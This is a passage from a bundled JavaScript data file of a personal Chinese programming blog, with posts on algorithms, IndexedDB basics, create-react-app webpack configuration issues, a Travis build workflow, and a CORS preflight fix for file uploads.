class=\\"hljs-keyword\\">if</span>(sum===target)result++\\n      sum-=arr[head++]\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> result\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-02","timeArr":[2018,9,2,0,0,0,0],"title":"获取数组中和为某个值的组合数量的算法","uuid":"d8cf763cd33c2883caf30f5d6f247da84af3cf8f","summary":"<p>记录一个算法，要求获取数组中的和为<code>sum</code>的组合的数量</p>\\n<ul>\\n<li>不要求连续，不要求重复</li>\\n</ul>\\n<p>例如<code>arr=[1,2,3,4,5]</code>，那么和为5的组合数量为3，分别是<code>2,3</code>、<code>1,4</code>、<code>5</code></p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">computeSubset</span>(<span class=\\"hljs-params\\">arr,sum</span>)</span>{\\n  <span class=\\"hljs-comment\\">// 创建数组，用于记录从1到sum每一个...</span></code></pre>","slug":"huo-qu-shu-zu-zhong-he-wei-mou-ge-zhi-de-zu-he-shu-liang-de-suan-fa","sha":"ccf5cf75d3f663c8c143ed75e3d46b5a2f8aa576"}')},602:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"hyperapp-patch\\">hyperapp-patch</h2>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.hyperapp/README.md\\">完整源码说明注释</a></p>\\n<p>patch是hyperapp进行节点更新的核心，主要步骤：</p>\\n<ul>\\n<li>先判断node节点</li>\\n<li>当节点相同---&gt;进行key判断---&gt;递归patch，直到指针到尾部</li>\\n<li>最后判断是否需要删除节点</li>\\n<li>返回更新的element</li>\\n</ul>\\n<p>思维导图：\\n<img src=\\"/article/img/hyperapp-patch%E5%AF%BC%E5%9B%BE.png\\" alt=\\"\\"></p>\\n","toc":[{"anchor":"hyperapp-patch","level":2,"text":"hyperapp-patch"}],"relatedTags":null,"created_at":"2018-07-02","timeArr":[2018,6,2,0,0,0,0],"title":"hyperapp-patch","uuid":"ab4d7fd4fc306830807768df35b00d9bc91c9d20","summary":"<h4>hyperapp-patch</h4>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.hyperapp/README.md\\">完整源码说明注释</a></p>\\n<p>patch是hyperapp进行节点更新的核心，主要步骤：</p>\\n<ul>\\n<li>先判断n...</li>\\n</ul>","slug":"hyperapp-patch","sha":"59bb573e47697c7551bfe0191079a8772342b529"}')},603:function(n){n.exports=JSON.parse('{"content":"<p>indexedDB\\n在客户端进行保存保存： </p>\\n<pre><code><pre class=\\"hljs\\"><code>{id: 1, name: &quot;张三&quot;, age: 24, email: &quot;zhangsan@example.com&quot;}\\n{id: 2, name: &quot;李四&quot;, age: 54, email: &quot;lisi@example.com&quot;}\\n{id: 3, name: &quot;王五&quot;, age: 36, email: &quot;wangwu@example.com&quot;}</code></pre></code></pre><ul>\\n<li>步骤1-创建数据库<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> request = <span class=\\"hljs-built_in\\">window</span>.indexedDB.open(<span class=\\"hljs-string\\">\\"test\\"</span>, <span class=\\"hljs-number\\">1</span>);\\n<span class=\\"hljs-keyword\\">var</span> db</code></pre></code></pre>\\n</li>\\n</ul>\\n<ul>\\n<li>步骤2-创建数据表，添加初始数据<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>request = <span class=\\"hljs-built_in\\">window</span>.indexedDB.open(<span class=\\"hljs-string\\">\\"test\\"</span>, <span class=\\"hljs-number\\">1</span>);\\nrequest.onupgradeneeded=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">e</span>)</span>{\\ndb = e.target.result;\\n<span class=\\"hljs-keyword\\">var</span> objectStore;\\n<span class=\\"hljs-keyword\\">if</span> (!db.objectStoreNames.contains(<span class=\\"hljs-string\\">\'person\'</span>)) {\\n  objectStore = db.createObjectStore(<span class=\\"hljs-string\\">\'person\'</span>, { <span class=\\"hljs-attr\\">keyPath</span>: <span class=\\"hljs-string\\">\'id\'</span> });\\n}\\nobjectStore.add({<span class=\\"hljs-attr\\">id</span>: <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\\"张三\\"</span>, <span class=\\"hljs-attr\\">age</span>: <span class=\\"hljs-number\\">24</span>, <span class=\\"hljs-attr\\">email</span>: <span class=\\"hljs-string\\">\\"zhangsan@example.com\\"</span>})\\n}</code></pre></code></pre>\\n</li>\\n</ul>\\n<ul>\\n<li><p>步骤3-增加数据</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>add()\\n<span class=\\"hljs-comment\\">// db存在</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">add</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n<span class=\\"hljs-keyword\\">var</span> addReq\\n<span class=\\"hljs-keyword\\">var</span> tra=db.transaction([<span class=\\"hljs-string\\">\'person\'</span>],<span class=\\"hljs-string\\">\'readwrite\'</span>)\\n<span class=\\"hljs-keyword\\">var</span> objS=tra.objectStore(<span class=\\"hljs-string\\">\'person\'</span>)\\naddReq=objS.add({<span class=\\"hljs-attr\\">id</span>: <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\\"李四\\"</span>, <span class=\\"hljs-attr\\">age</span>: <span class=\\"hljs-number\\">54</span>, <span class=\\"hljs-attr\\">email</span>: <span class=\\"hljs-string\\">\\"lisi@example.com\\"</span>})\\naddReq=objS.add({<span class=\\"hljs-attr\\">id</span>: <span class=\\"hljs-number\\">3</span>, <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\\"王五\\"</span>, <span class=\\"hljs-attr\\">age</span>: <span class=\\"hljs-number\\">36</span>, <span class=\\"hljs-attr\\">email</span>: <span class=\\"hljs-string\\">\\"wangwu@example.com\\"</span>})\\naddReq.onsuccess = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">event</span>) </span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'数据写入成功\'</span>);\\n};\\n\\naddReq.onerror = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">event</span>) </span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'数据写入失败\'</span>);\\n}\\n}\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code>* 步骤4-查找数据表\\n```js\\nrequest = window.indexedDB.open(&quot;test&quot;, 1);\\nrequest.onsuccess=function(e){\\n  db=e.target.result\\n  var tra=db.transaction([\'person\'])\\n  var objS=tra.objectStore(\'person\')\\n  console.log(objS.getAll().result)\\n}</code></pre></code></pre><p>参考：<a href=\\"https://wangdoc.com/javascript/bom/indexeddb.html\\">https://wangdoc.com/javascript/bom/indexeddb.html</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-15","timeArr":[2018,7,15,0,0,0,0],"title":"indexedDB简要增删查","uuid":"b8d2829958b70c73fa0733e45fe779eff931cbc5","summary":"<p>indexedDB\\n在客户端进行保存保存：</p>\\n<pre class=\\"hljs\\"><code>{id: 1, name: &quot;张三&quot;, age: 24, email: &quot;zhangsan@example.com&quot;}\\n{id: 2, name: &quot;李四&quot;, age: 54, email: &quot;lisi@example.com&quot;}\\n{id: 3, name: &quot;王五...</code></pre>","slug":"indexedDB-jian-yao-zeng-shan-cha","sha":"b9c382c33ecfc711c7de0a929d346090b6c78122"}')},604:function(n){n.exports=JSON.parse('{"content":"<p><code>CRA</code>的webpack配置强大的很重要一点就是通过不断地解决一个个issue，才能达到今天的兼容性和性能。</p>\\n<p>下面来数一数曾经的issue和对应的解决办法。</p>\\n<ul>\\n<li>关于<code>postcss-loader</code>的<code>ident</code></li>\\n</ul>\\n<p>它是一个唯一标识符，引用webpack的原话，是要求<code>plugins</code>为函数(复杂配置)的时候，必须要<code>ident</code></p>\\n<blockquote>\\n<p>⚠webpack requires an identifier (ident) in options when {Function}/require is used (Complex Options).\\n The ident can be freely named as long as it is unique. It&#39;s recommended to name it (ident: &#39;postcss&#39;)</p>\\n</blockquote>\\n<pre><code><pre class=\\"hljs\\"><code>loader: require.resolve(\'postcss-loader\'),\\n      options: {\\n        // Necessary for external CSS imports to work\\n        // https://github.com/facebook/create-react-app/issues/2677\\n        // 根据2677问题这里有必要添加ident\\n        // webpack需要的一个标识符，唯一值\\n        ident: \'postcss\',\\n        plugins: () =&gt; [\\n          // 对flex一些bug变通解决方案\\n          require(\'postcss-flexbugs-fixes\'),\\n          // 能使用未来的css语法，变量嵌套等\\n          require(\'postcss-preset-env\')({\\n          ...</code></pre></code></pre><p>那么2677问题是什么呢</p>\\n<p>这里添加了一个node_modules的<code>normalize.css</code>(~代表node_modules)</p>\\n<pre><code><pre class=\\"hljs\\"><code>create-react-app postcssbug\\ncd postcssbug\\nyarn add normalize.css\\necho &quot;@import \'~normalize.css/normalize.css\';&quot; &gt;&gt; src/index.css\\nyarn start</code></pre></code></pre><p>结果报错如下：\\n<img src=\\"https://user-images.githubusercontent.com/5342/27674917-75d4e984-5cc5-11e7-95cc-a7737a7638fb.png\\" alt=\\"\\"></p>\\n<p>通过对这个问题的讨论，引出了一个几天前的PR，\\n<a href=\\"https://github.com/facebook/create-react-app/pull/2430\\">https://github.com/facebook/create-react-app/pull/2430</a></p>\\n<p>这个PR删除了loader中原本存在的ident</p>\\n<blockquote>\\n<p>Since v2.2.1 of Webpack, the need for ident for complex options is no longer required. See\\n <a href=\\"https://webpack.js.org/guides/migrating/#complex-options\\">https://webpack.js.org/guides/migrating/#complex-options</a></p>\\n</blockquote>\\n<p> 但这个webpack的migrating已经不存在了，或许当时webpack写得和现在不一样了。</p>\\n<p> 最终还是将ident加了回去，并且注明ident是必要的，特别是引入外部css的时候。</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-16","timeArr":[2018,9,16,0,0,0,0],"title":"记录CRA的webpack配置曾经的issue-1","uuid":"42db7875df4e226dd9de2945de9bc1f9b287114c","summary":"<p>⚠webpack requires an identifier (ident) in options when {Function}/require is used (Complex Options).\\nThe ident can be freely named as long as it is unique. It\'s recommended to name it (ident: \'postcss\')</p>","slug":"ji-lu-CRA-de-webpack-pei-zhi-ceng-jing-de-issue-1","sha":"68bd27b56a1e0ed5a6a7ea8b9e7a53a8221e699d"}')},605:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>关于Uglify的<code>compress</code></li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code> compress: {\\n    ecma: 5,\\n    warnings: false,\\n    // Disabled because of an issue with Uglify breaking seemingly valid code:\\n    // https://github.com/facebook/create-react-app/issues/2376\\n    // Pending further investigation:\\n    // https://github.com/mishoo/UglifyJS2/issues/2011\\n    comparisons: false,\\n    // Disabled because of an issue with Terser breaking valid code:\\n    // https://github.com/facebook/create-react-app/issues/5250\\n    // Pending futher investigation:\\n    // https://github.com/terser-js/terser/issues/120\\n    inline: 2,\\n  },</code></pre></code></pre><p>这里有2个问题</p>\\n<p>第一个是<code>comparisons</code>的作用是二元运算的优化，例如<code>a = !b &amp;&amp; !c &amp;&amp; !d &amp;&amp; !e</code>会转换成<code>a=!(b||c||d||e)</code></p>\\n<p>2376问题是使用了一个<code>react-mapbox-gl</code>的组件(google地图)</p>\\n<p>编译后发生错误，经过讨论调试后，正是<code>comparisons</code>选项出现了问题，<code>Uglify</code>认为是具体代码编写没有符合规范所导致。</p>\\n<p>直到18年7月，<code>https://github.com/mapbox/mapbox-gl-js/pull/6956</code></p>\\n<p><code>react-mapbox-gl</code>修复了这个问题。</p>\\n<p>第二个<code>inline</code>的作用是内联函数调用</p>\\n<p>例如：</p>\\n<pre><code><pre class=\\"hljs\\"><code>function simple(a,b){\\n return a+b\\n}\\nfucntion complex(){\\n  // ...\\n  let sum=simple(1,2)\\n  // ...\\n  return sum\\n}</code></pre></code></pre><p>将会转换为</p>\\n<pre><code><pre class=\\"hljs\\"><code>fucntion complex(){\\n  // ...\\n  let sum=1+2\\n  // ...\\n  return sum\\n}</code></pre></code></pre><p><code>inline:2</code>(修改后)：内联调用带参数的简单函数</p>\\n<p><code>inline:3</code>(修改前)：内联调用带参数和带变量的简单函数</p>\\n<p>个人猜测：具体出错原因可能是变量使用了作用域以外的，导致冲突。</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-17","timeArr":[2018,9,17,0,0,0,0],"title":"记录CRA的webpack配置曾经的issue-2","uuid":"09551be59c48cabd2ec9043da881b563d7044cbf","summary":"<ul>\\n<li>关于Uglify的<code>compress</code></li>\\n</ul>\\n<pre class=\\"hljs\\"><code> compress: {\\n    ecma: 5,\\n    warnings: false,\\n    // Disabled because of an issue with Uglify breaking seemingly valid code:\\n    // ...</code></pre>","slug":"ji-lu-CRA-de-webpack-pei-zhi-ceng-jing-de-issue-2","sha":"727e95a1ec46dc90c1cfe467e84a90fa08aedfb0"}')},606:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li><code>terser</code>的配置output</li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code>terserOptions: {\\n  ...\\n  output: {\\n    ...      \\n    // Turned on because emoji and regex is not minified properly using default\\n    // https://github.com/facebook/create-react-app/issues/2488\\n    ascii_only: true,\\n  },</code></pre></code></pre><p>这里2488问题是提出了一个emoji在prod模式下无法正常显示，然后也有人提出正则同样会出现被压缩过滤的bug。</p>\\n<p>这里需要配置为<code>true</code>，不压缩Unicode字符。</p>\\n<ul>\\n<li><code>optimization</code>的<code>splitChunks</code></li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code>optimization: {\\n    ...\\n    // Automatically split vendor and commons\\n    // https://twitter.com/wSokra/status/969633336732905474\\n    // https://medium.com/webpack/webpack-4-code-splitting-chunk-graph-and-the-splitchunks-optimization-be739a861366\\n    splitChunks: {\\n      chunks: \'all\',\\n      name: false,\\n    },\\n}</code></pre></code></pre><p>这里提到了一篇博文和medium文章，都是认为<code>splitChunks</code>的chunks应该配置为<code>all</code>，以便既可以提取<code>async</code>也可以提取<code>sync</code>的模块。</p>\\n<p>而<code>name</code>建议prod模式设置为false，以便当变更的时候能及时更新。</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-18","timeArr":[2018,9,18,0,0,0,0],"title":"记录CRA的webpack配置曾经的issue-3","uuid":"f0f5a9f7c1ddeec7f61b8a95cfc5ec817c6bd3fb","summary":"<ul>\\n<li><code>terser</code>的配置output</li>\\n</ul>\\n<pre class=\\"hljs\\"><code>terserOptions: {\\n  ...\\n  output: {\\n    ...      \\n    // Turned on because emoji and regex is not minified properly using default\\n    //...</code></pre>","slug":"ji-lu-CRA-de-webpack-pei-zhi-ceng-jing-de-issue-3","sha":"578982e3d37ef324089ae9591f0a39802c74a3a1"}')},607:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>webpack的<code>sideEffect</code></li>\\n</ul>\\n<p>在配置css-loader的内部</p>\\n<pre><code><pre class=\\"hljs\\"><code>{\\n  test: sassRegex,\\n  ...\\n  // Don\'t consider CSS imports dead code even if the\\n  // containing package claims to have no side effects.\\n  // Remove this when webpack adds a warning or an error for this.\\n  // See https://github.com/webpack/webpack/issues/6571\\n  sideEffects: true,\\n  },</code></pre></code></pre><p>这里有个<code>sideEffects</code>配置，sideEffect配置能让开发者去告诉webpack，这里是不是有副作用，\\n副作用大概就是指会影响到模块外部内容。</p>\\n<p><code>CRA</code>这里提出不用去考虑css的摇树优化。</p>\\n<p>这里给出了一个issue6571，但实际问题应该由\\n<a href=\\"https://github.com/facebook/create-react-app/issues/5140\\">https://github.com/facebook/create-react-app/issues/5140</a>\\n开始。</p>\\n<p>5140问题提出者指出当他这么使用</p>\\n<p><code>import &#39;react-octagon/lib/styles/semantic.css&#39;</code></p>\\n<p>在开发模式下没有问题，但生产模式下则这段css都不见了。</p>\\n<p>经过讨论一番，原因有2点：</p>\\n<ol>\\n<li><p>edmorley提出<code>react-octagon</code>在<code>package.json</code>内部使用了<code>sideEffect:false</code> </p>\\n<blockquote>\\n<p>The react-octagon package has set sideEffects: false in their package.json:\\n <a href=\\"https://github.com/Tripwire/octagon/blob/v15.1.2/package.json#L98\\">https://github.com/Tripwire/octagon/blob/v15.1.2/package.json#L98</a></p>\\n</blockquote>\\n</li>\\n<li><p><code>CRA</code>未对sideEffect进行配置。</p>\\n</li>\\n</ol>\\n<p>这两个问题导致webpack认为这一段<code>import &#39;react-octagon/lib/styles/semantic.css&#39;</code>是一个不含副作用的，\\n在摇树优化的时候便将它直接剪掉了。</p>\\n<p>接着进入<code>https://github.com/webpack/webpack/issues/6571</code>问题</p>\\n<p>这个是在<code>webpack</code>库上的问题，提出者认为</p>\\n<p><code>import &#39;list/fantasy-land&#39;</code>在<code>sideEffect:false</code>的情况下应该被剪掉。</p>\\n<p>此次的讨论大致观点认为，当<code>import  xxx</code>的写法时，是一种暗示有副作用的导入，不应该被<code>sideEffect</code>剪掉。</p>\\n<p>但webpack成员<code>sokra</code><a href=\\"https://github.com/webpack/webpack/issues/6571#issuecomment-425666425\\">认为</a>，\\n当设置了<code>sideEffect:false</code>的情况，再去<code>import xxx</code>是一种不正确的写法，并且他认为或许未来添加一个warning是可以接受的。</p>\\n<p>他也认为所有的CSS文件都应该是有副作用的，因为CSS内部的<code>import xxx</code>都是有效的。</p>\\n<p>至此，<code>CRA</code>作者Dan认为，在webpack对这种<code>import xx</code>没有提示warning或者error之前，所有CSS内容都认为是有副作用的<code>sideEffect:true</code>。</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-25","timeArr":[2018,9,25,0,0,0,0],"title":"记录CRA的webpack配置曾经的issue-4","uuid":"26521baed3a1e852019bad397f751e106be8b610","summary":"<ul>\\n<li>webpack的<code>sideEffect</code></li>\\n</ul>\\n<p>在配置css-loader的内部</p>\\n<pre class=\\"hljs\\"><code>{\\n  test: sassRegex,\\n  ...\\n  // Don\'t consider CSS imports dead code even if the\\n  // containing package claims to...</code></pre>","slug":"ji-lu-CRA-de-webpack-pei-zhi-ceng-jing-de-issue-4","sha":"c652978c17e0cd7fcf3dd94e0dab32551f0b884e"}')},608:function(n){n.exports=JSON.parse('{"content":"<p>问题地址：<a href=\\"https://github.com/facebook/create-react-app/issues/240\\">https://github.com/facebook/create-react-app/issues/240</a></p>\\n<p>触发原因：</p>\\n<p>在一次处理组件的分割子组件和引用时，由于大小写的失误，导致热更新失败。</p>\\n<p>解决方案：</p>\\n<p>添加插件：<code>case-sensitive-paths-webpack-plugin</code></p>\\n<p>插件作用：此Webpack插件强制所有必需模块的完整路径与磁盘上实际路径的确切大小写相匹配。</p>\\n<hr>\\n<p>问题地址：<a href=\\"https://github.com/facebook/create-react-app/issues/186\\">https://github.com/facebook/create-react-app/issues/186</a></p>\\n<p>触发原因：</p>\\n<p>当添加一个模块后，并不会自动尝试更新。</p>\\n<p>解决方案：</p>\\n<p><code>CRA</code>提供了一个<code>./react-dev-utils/WatchMissingNodeModulesPlugin.js</code>插件。</p>\\n<p>插件作用：检测之前不存在的模块是否存在于<code>node_module</code>路径上，如果存在，则添加到当前的依赖列表中。</p>\\n<hr>\\n<p>问题地址：<a href=\\"https://github.com/facebook/create-react-app/pull/4234\\">https://github.com/facebook/create-react-app/pull/4234</a></p>\\n<p>触发原因：</p>\\n<p>早起使用<code>UglifyJsPlugin</code>插件的时候，其中设置<code>ecma: 8</code>，这意味着不仅仅解析<code>ecma8</code>的代码，同样将代码压缩至<code>ecma8</code>。</p>\\n<p>解决方案：</p>\\n<p>分项设置：</p>\\n<pre><code><pre class=\\"hljs\\"><code>{\\n  parse: {ecma: 8,...},\\n  compress: {ecma: 5,...},\\n  output: {ecma: 5,...},\\n}</code></pre></code></pre><p>这么设置，意思是，能够处理<code>ecma8</code>的代码，压缩的版本最低为<code>ecma5</code>，代码显示也为<code>ecma5</code>。</p>\\n<p>注意：这里<code>compress</code>设置为<code>5</code>并不会将代码从<code>es6</code>转换为<code>es5</code>后，再去压缩。</p>\\n<p>相反，如果设置<code>ecma:6</code>后，遇到<code>es5</code>的代码，则会转换为<code>es6</code>再压缩。</p>\\n","toc":[],"relatedTags":null,"created_at":"2019-05-16","timeArr":[2019,4,16,0,0,0,0],"title":"记录CRA的webpack配置曾经的issue-5","uuid":"61201b4391ad7bf76e96a9ebee00ef017060bc32","summary":"<p>问题地址：<a href=\\"https://github.com/facebook/create-react-app/issues/240\\">https://github.com/facebook/create-react-app/issues/240</a></p>\\n<p>触发原因：</p>\\n<p>在一次处理组件的分割子组件和引用时，由于大小写的失误，导致热更...</p>","slug":"ji-lu-CRA-de-webpack-pei-zhi-ceng-jing-de-issue-5","sha":"8d6fcb285907c764f600268a93546755ad3d3afa"}')},609:function(n){n.exports=JSON.parse('{"content":"<p>环境：3个文件夹</p>\\n<ul>\\n<li>blogs 用于写博客</li>\\n<li>create-my-blog 用于获取博客内容和创建静态博客页面</li>\\n<li>stonehank.github.io 用于展示博客</li>\\n</ul>\\n<p>造成文件夹比较繁杂是因为当时写的时候并没有想去在github做一个博客页面。</p>\\n<p>自动构建前的流程：</p>\\n<p>|—blogs</p>\\n<p><code>git commit</code>和<code>git push</code>上传最新博客内容</p>\\n<p>|—create-my-blog</p>\\n<ol>\\n<li><code>fetch</code>最新资源</li>\\n<li><code>git run test</code>测试</li>\\n<li><code>git commit</code>确认文件</li>\\n<li><code>npm run build</code>构建静态资源</li>\\n<li>手动copy<code>build</code>文件夹的内容至<code>stonehank.github.io</code></li>\\n</ol>\\n<p>|—stonehank.github.io</p>\\n<p><code>git commit</code>和<code>git push</code>上传至github</p>\\n<hr>\\n<p>自动构建过程中将create-my-blog和stonehank.github.io作为一个仓库的两个分支处理。</p>\\n<hr>\\n<p>自动构建后的流程：</p>\\n<p>|—blogs</p>\\n<p><code>git commit</code>和<code>git push</code>上传最新博客内容</p>\\n<p>|—stonehank.github.io</p>\\n<ol>\\n<li><code>fetch</code>最新资源</li>\\n<li><code>git commit</code>和<code>git push</code></li>\\n</ol>\\n<p>自动构建过程：</p>\\n<ol>\\n<li><code>npm run build</code>构建静态资源</li>\\n<li><code>git push</code>build文件夹内容到<code>master</code>分支</li>\\n</ol>\\n<p>流程做个记录。 </p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-21","timeArr":[2018,9,21,0,0,0,0],"title":"记录一次Travis构建前后流程","uuid":"34a2842eae3595228bf0ac5e118a4db4df7b7344","summary":"<p>环境：3个文件夹</p>\\n<ul>\\n<li>blogs 用于写博客</li>\\n<li>create-my-blog 用于获取博客内容和创建静态博客页面</li>\\n<li>stonehank.github.io 用于展示博客</li>\\n</ul>\\n<p>造成文件夹比较繁杂是因为当时写的时候并没有想去在github做一个博客页面。</p>\\n<p>自动构建前的流程：</p>\\n<p>|—blogs</p>\\n<p><code>git commit</code>...</p>","slug":"ji-lu-yi-ci-Travis-gou-jian-qian-hou-liu-cheng","sha":"e8224d6946122b6d3062e3637631d9202e32bd4c"}')},610:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"yi-ci-xhruploadonprogress-yu-multiparty-da-pei-de-cai-keng-ji-lu\\">一次xhr.upload.onprogress与multiparty搭配的踩坑记录</h2>\\n<p>有一个<a href=\\"https://github.com/stonehank/blogs/blob/master/07-26-%E9%80%9A%E8%BF%87blob%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E7%BB%AD%E4%BC%A0%E8%AE%B0%E5%BD%95(nodejs).md\\">分段上传的demo</a>，设定每次上传大小为1MB，但当网速过慢的时候，进度条会等待很久(1MB上传完毕)\\n才会增加变化，于是想通过<code>xhr.onprogress</code>对其进行实时监控</p>\\n<p>因为是上传文件，需要使用<code>xhr.upload.onprogress</code>，但会发出跨域错误</p>\\n<p>原来<code>xhr.upload.onprogress</code>会被认为是一个非简单请求，需要预检请求，而预检请求是一个OPTIONS方法，默认的跨域配置并不支持OPTIONS方法</p>\\n<p>这就是问题原因</p>\\n<p>解决办法：</p>\\n<p>首先要在服务端添加OPTIONS处理方法</p>\\n<p><code>res.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;POST, GET, OPTIONS&quot;)</code></p>\\n<p>结果还是不行，查看报错信息(此处使用了<code>multiparty</code>对<code>formData</code>解析)</p>\\n<pre><code><pre class=\\"hljs\\"><code>Error: missing content-type header</code></pre></code></pre><p>原来在<code>multiparty</code>内部使用<code>form.parse(req)</code>时会检测<code>content-type</code>，而options请求不带<code>content-type</code>，因此会触发错误</p>\\n<p>尝试1：在client内部进行添加<code>xhr.setRequestHeader(&#39;content-type&#39;, &#39;multipart/form-data&#39;)</code>，但是options并不会带上这个content-type</p>\\n<p>最终解决：采取当method为<code>OPTIONS</code>时，直接返回204</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">if</span>(req.method===<span class=\\"hljs-string\\">\\"OPTIONS\\"</span>){\\n    res.statusCode=<span class=\\"hljs-number\\">204</span>\\n    res.end()\\n  }<span class=\\"hljs-keyword\\">else</span>{\\n  <span class=\\"hljs-comment\\">//此处会检测content-type，而options请求不带content-type，因此会触发错误</span>\\n    form.parse(req)\\n  }</code></pre></code></pre>\\n","toc":[{"anchor":"yi-ci-xhruploadonprogress-yu-multiparty-da-pei-de-cai-keng-ji-lu","level":2,"text":"一次xhr.upload.onprogress与multiparty搭配的踩坑记录"}],"relatedTags":null,"created_at":"2018-08-18","timeArr":[2018,7,18,0,0,0,0],"title":"记录一次xhr.upload.onprogress填坑","uuid":"f72ad63b02516bf71d570ecbf6c39488e64deb8e","summary":"<h4>一次xhr.upload.onprogress与multiparty搭配的踩坑记录</h4>\\n<p>有一个[分段上传的demo](https://github.com/stonehank/blogs/blob/master/07-26-%E9%80%9A%E8%BF%87blob%E5%AE%9E%E7%8E%B0%E6%96...</p>","slug":"ji-lu-yi-ci-xhr.upload.onprogress-tian-keng","sha":"bc7ed8c6eae00e50c69810221c75724e5987c3ef"}')},611:function(n){n.exports=JSON.parse('{"content":"<p><a href=\\"https://leetcode.com/problems/single-number-ii/description/\\">原题目：</a>\\n<code>LeetCode</code>的一个题目，要求算出数组中单独出现的数字</p>\\n<pre><code><pre class=\\"hljs\\"><code>Given a non-empty array of integers, every element appears three times except for one, which appears exactly once. Find that single one.\\n\\nNote:\\n\\nYour algorithm should have a linear runtime complexity. Could you implement it without using extra memory?\\n\\nExample 1:\\n\\nInput: [2,2,3,2]\\nOutput: 3\\nExample 2:\\n\\nInput: [0,1,0,1,0,1,99]\\nOutput: 99</code></pre></code></pre><p>题目有一个限制：空间复杂度<code>O(1)</code></p>\\n<p>解决代码(简洁到发指)：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> singleNumber = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">nums</span>) </span>{\\n    <span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-number\\">0</span>,b=<span class=\\"hljs-number\\">0</span>\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> n <span class=\\"hljs-keyword\\">of</span> nums){\\n        a=(a^n) &amp; ~b\\n        b=(b^n) &amp; ~a\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> a\\n};</code></pre></code></pre>\\n<hr>\\n<p>思路：</p>\\n<ol>\\n<li>我们要过滤出现3个的，保留出现1个的，那么就需要一个<code>状态机</code>，它达到3时为0，达到1时为它本身</li>\\n<li>为了完成第一条，需要2个辅助变量<code>a</code>,<code>b</code>，达到以下状态</li>\\n</ol>\\n<pre><code><pre class=\\"hljs\\"><code>　　　　　　　　　　  a  b\\n初始值  　　　　 ：   0   0\\n第一次碰见某个数n：   0   n\\n第二次碰见某个数n：   n   0\\n第三次碰见某个数n：   0   0</code></pre></code></pre><p>3.有上面看出，a,b初始值为0，</p>\\n<p>b的1,2步很简单，直接 <code>n ^ b</code>两次，但第三步需要处理一个额外的数，</p>\\n<p>a也可以先异或，再处理一个数，</p>\\n<p>我们先手动添加这个数，为了让它们打到状态值</p>\\n<p>b第一步：<code>(b ^ n) &amp; n    ----&gt; n</code></p>\\n<p>b第二步：<code>(b ^ n) &amp; any(n)  ----&gt; 0</code></p>\\n<p>b第三步：<code>(b ^ n) &amp; 0    ----&gt; 0</code></p>\\n<p>再看a的三步：</p>\\n<p>a第一步：<code>(a ^ n) &amp; 0  ----&gt; 0</code></p>\\n<p>a第二步：<code>(a ^ n) &amp; n  ----&gt; n</code></p>\\n<p>a第三步：<code>(a ^ n) &amp; any(n)  ----&gt; 0</code></p>\\n<p>这里<code>any</code>可以表示任何数，为了方便我们用<code>n</code>去代替(后面的括号)</p>\\n<p>但这样后面那个数没有固定，就不能使用迭代，需要选择一个变量(会自动变化的)</p>\\n<p>4.看看b的输出值，<code>n,0,0</code>，看看a的需要的值<code>0,n,n</code> ，这就可以写一个转换函数</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> cov=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">x,n</span>)=&gt;</span>x===<span class=\\"hljs-number\\">0</span>?n:<span class=\\"hljs-number\\">0</span> </code></pre></code></pre>\\n<p>因此合并起来可以写成：</p>\\n<p>b第一步：<code>(b ^ n) &amp; n    ----&gt; n</code></p>\\n<p>a第一步：<code>(a ^ n) &amp; cov(b,n)  